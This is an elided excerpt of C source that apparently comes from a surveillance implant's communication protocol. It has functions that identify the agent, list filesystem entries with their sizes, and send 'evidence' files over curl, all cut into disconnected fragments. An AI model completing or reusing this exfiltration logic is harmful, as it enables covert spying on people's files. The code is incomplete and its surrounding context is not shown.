...
int proto_id(PROTO_CTX *proto_ctx)
{
   ...
   do {
      ...
      BIO_write_int(bio_data, bps.version);
...
int proto_conf(PROTO_CTX *proto_ctx)
{
   ...
   do {
      ...
      BIO_write_int(bio_data, PROTO_OK);
      if((ret = doreq(proto_ctx, PROTO_CONF, bio_data)) != PROTO_OK) break;
   } while(0);
...
int proto_filesystem(PROTO_CTX *proto_ctx)
{
   ...
   char name[512], *expand = NULL;
   glob_t globbuf;
   int i, filenamelen, flags, version = 2010031501;
   ...
   do {
      ...
      while(num--) {
         ...
         for(i = 0; i < globbuf.gl_pathc; i++) {
            ...
            debugme("--- [%c] %s\n", S_ISDIR(s.st_mode) ? 'D' : 'F', entry);
            filenamelen = strlen16(entry);
            flags = S_ISDIR(s.st_mode) ? 1 : 0;
            filesizelow = S_ISDIR(s.st_mode) ? 0 : (unsigned int)(s.st_size & 0x00000000FFFFFFFFLL);
            filesizehigh = S_ISDIR(s.st_mode) ? 0 : (unsigned int)((s.st_size>>32) & 0x00000000FFFFFFFFLL);
...
int proto_sendevidence(PROTO_CTX *proto_ctx)
{
   ...
   do {
      ...
      for(i = 0; i < n; i++)  {
         ...
         BIO_write_int(bio_data, s.st_size);
         ...
         if(curl_easy_setopt(proto_ctx->curl, CURLOPT_USERAGENT, de[i]->d_name)) break;
